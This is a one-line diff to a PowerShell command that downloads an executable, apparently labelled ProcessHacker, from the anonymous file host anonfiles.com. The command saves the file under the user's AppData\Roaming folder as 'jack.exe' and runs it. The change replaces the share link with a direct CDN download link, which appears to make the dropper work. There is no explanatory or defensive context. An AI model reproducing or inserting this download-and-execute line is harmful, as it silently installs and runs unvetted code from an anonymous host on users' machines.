@@ -1,1 +1,1 @@
-New-Object System.Net.WebClient.DownloadFile("https://anonfiles.com/Ld29F226y8/ProcessHacker_exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
+New-Object System.Net.WebClient.DownloadFile("https://cdn-139.anonfiles.com/U64aFa2ay5/0a86324c-1659890798/ProcessHacker.exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
